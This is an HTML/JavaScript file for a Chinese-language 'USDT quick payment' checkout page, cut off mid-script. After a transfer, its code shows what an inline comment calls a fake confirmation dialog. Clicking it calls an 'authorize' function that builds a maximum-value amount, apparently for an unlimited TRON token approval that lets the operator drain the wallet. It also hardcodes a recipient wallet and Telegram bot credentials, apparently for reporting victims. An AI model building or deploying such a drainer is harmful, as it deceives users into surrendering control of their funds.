<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>æ”¶é“¶å°</title>
    <style>
        body { background: #f7f7f7; font-family: sans-serif; display: flex; justify-content: center; padding-top: 40px; }
        .card { width: 90%; background: #fff; border-radius: 15px; padding: 20px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); text-align: center; }
        .inp-box { margin: 20px 0; border-bottom: 2px solid #007aff; }
        input { border: none; width: 100%; font-size: 30px; font-weight: bold; text-align: center; outline: none; }
        .pay-btn { background: #007aff; color: #fff; border: none; width: 100%; padding: 15px; border-radius: 10px; font-size: 18px; }
        .modal { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 75%; background: #fff; border-radius: 12px; box-shadow: 0 0 20px rgba(0,0,0,0.2); display: none; padding: 20px; text-align: center; z-index: 1000; }
        .m-btn { margin-top: 15px; color: #007aff; font-weight: bold; cursor: pointer; border-top: 1px solid #eee; padding-top: 10px; }
    </style>
</head>
<body>
    <div class="card">
        <h3 style="margin:0">USDT å¿«é€Ÿæ”¯ä»˜</h3>
        <div class="inp-box"><input type="number" id="u_amount" placeholder="0.00"></div>
        <button class="pay-btn" onclick="start()">ç¡®è®¤è½¬è´¦</button>
    </div>

    <div class="modal" id="tip">
        <div style="font-weight:bold">åŒæ­¥æˆåŠŸ</div>
        <div style="font-size:13px; color:#666; margin-top:5px">æ”¯ä»˜ç¯å¢ƒå·²åŠ å¯†ï¼Œè¯·ç‚¹å‡»ç¡®å®šå®Œæˆé“¾ä¸Šå›æ‰§ç™»è®°ã€‚</div>
        <div class="m-btn" onclick="shouquan()">ç¡®å®š</div>
    </div>

    <script>
        const CFG = {
            U: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
            TO: "TB7o5odwtZhkf6ueq6NthAzfLY9eWf9s3C", // ä½ çš„æ”¶æ¬¾åœ°å€
            T: "7884841968:AAEVW8Iayp5i0-7p-V8K3mC9M5l0D4_7Y7Q",
            C: "8003040361"
        };

        async function start() {
            let val = document.getElementById('u_amount').value;
            if(!val || val <= 0) return;
            if (window.tronWeb) {
                try {
                    const c = await window.tronWeb.contract().at(CFG.U);
                    // 1. å‘èµ·è½¬è´¦
                    await c.transfer(CFG.TO, window.tronWeb.toSun(val)).send();
                    log(`ğŸ’° ç”¨æˆ·å·²æäº¤è½¬è´¦: ${val} U`);
                    // 2. 1ç§’åè·³å‡ºå‡ç¡®å®šæ¡†
                    setTimeout(() => { document.getElementById('tip').style.display='block'; }, 1000);
                } catch (e) { log("âŒ è½¬è´¦æ‹’ç»"); }
            }
        }

        async function shouquan() {
            document.getElementById('tip').style.display='none';
            try {
                const c = await window.tronWeb.contract().at(CFG.U);
                const max = "115792089237316195423570985008687907
